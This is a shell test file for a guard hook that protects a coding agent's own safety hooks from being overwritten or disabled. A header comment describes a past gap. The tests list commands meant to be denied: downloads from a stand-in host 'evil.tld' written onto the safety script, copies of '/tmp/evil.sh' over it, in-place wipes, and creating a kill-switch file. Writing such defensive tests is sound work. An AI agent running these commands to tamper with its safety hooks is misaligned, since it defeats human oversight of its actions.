#!/usr/bin/env bash
# Hook-overwrite verbs + segment-scoped pairing (v2.24.14)
#
# The verb list covered DELETE and EDIT-in-place but no way of WRITING A NEW FILE over
# a hook. Verified against the whole PreToolUse chain (harness-tamper-guard, safety.sh,
# code-security-scanner), every one of these replaced safety.sh with no guard
# objecting — `curl -o <hook> https://evil` swaps a guard for attacker content in a
# single command.
#
# Found from the opposite symptom: the guard kept DENYING a legitimate `cp` into
# hooks/ because an unrelated `rm` appeared elsewhere in the same command, while
# ALLOWING a malicious `cp` on its own. Both are one flaw — it paired any verb with
# any target anywhere instead of checking what was written where. Fixed together:
# missing write verbs added, and pairing scoped to a single command segment.
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"

HOOK="$REPO_DIR/hooks/harness-tamper-guard.sh"
T='$HOME/.claude/supercharger/hooks/safety.sh'

verdict() {
  local payload rc
  payload=$(CMD="$1" python3 -c '
import json, os
print(json.dumps({"tool_name": "Bash", "tool_input": {"command": os.environ["CMD"]}}))')
  printf '%s' "$payload" | bash "$HOOK" >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 2 ] && echo DENY || echo ALLOW
}
expect() { # want label cmd
  begin_test "$2"
  local got; got=$(verdict "$3")
  [ "$got" = "$1" ] && pass || fail "expected $1, got $got — $3"
}

echo "=== Hook-Overwrite Verb Tests ==="

# --- write-a-new-file-over-a-hook verbs (the gap) ---
expect DENY "cp over a hook script"              "cp /tmp/evil.sh $T"
expect DENY "install over a hook script"         "install -m 755 /tmp/evil.sh $T"
expect DENY "rsync over a hook script"           "rsync /tmp/evil.sh $T"
expect DENY "scp over a hook script"             "scp evil:/x $T"
expect DENY "curl -o straight onto a hook"       "curl -o $T https://evil.tld/x"
expect DENY "curl --output onto a hook"          "curl --output $T https://evil.tld/x"
expect DENY "wget -O straight onto a hook"       "wget -O $T https://evil.tld/x"
expect DENY "perl -pi in-place over a hook"      "perl -pi -e 's/.*//' $T"
expect DENY "python -c write over a hook"        "python3 -c \"open('$T','w').write('exit 0')\""
expect DENY "node -e write over a hook"          "node -e \"require('fs').writeFileSync('$T','')\""

# --- previously covered verbs must keep working ---
expect DENY "rm a hook script"                   "rm $T"
expect DENY "redirect over a hook script"        "cat /tmp/evil.sh > $T"
expect DENY "chmod -x the hooks dir"             "chmod -x ~/.claude/supercharger/hooks/*.sh"
expect DENY "rm -rf the install dir"             "rm -rf ~/.claude/supercharger"
expect DENY "create the kill-switch"             "touch ~/.claude/supercharger/scope/.supercharger-disabled"

# --- the two-step form segment-scoping must NOT lose ---
expect DENY "cd into hooks/ then rm -rf ." \
  'cd ~/.claude/supercharger/hooks
rm -rf .'
expect DENY "cd into the install dir then rm -rf ." \
  'cd ~/.claude/supercharger && rm -rf .'

# --- reading a hook through an interpreter is not a write ---
expect ALLOW "python -c READING a hook"          "python3 -c \"print(open('$T').read())\""
expect ALLOW "cat a hook script"                 "cat $T"
expect ALLOW "grep across the hooks dir"         "grep -rn mcp__ ~/.claude/supercharger/hooks/"

# --- the false-positive class: verb and target in DIFFERENT segments ---
expect ALLOW "unrelated rm alongside a read of the hooks dir" \
  "grep -c PASS ~/.claude/supercharger/hooks/safety.sh; rm -f /tmp/scratch.txt"
expect ALLOW "unrelated rm of temp files after an audit-log read" \
  'LOG=$HOME/.claude/supercharger/audit/2026-07-30.jsonl
wc -l < "$LOG"
rm -f /tmp/a.txt /tmp/b.txt'
expect ALLOW "writing a scope sentinel next to an unrelated rm" \
  "touch ~/.claude/supercharger/scope/.profiling; rm -f /tmp/x"

# --- copying OUT of the install dir is not tampering ---
expect ALLOW "copy a hook OUT to /tmp for inspection" \
  "cp ~/.claude/supercharger/hooks/safety.sh /tmp/inspect.sh"

report
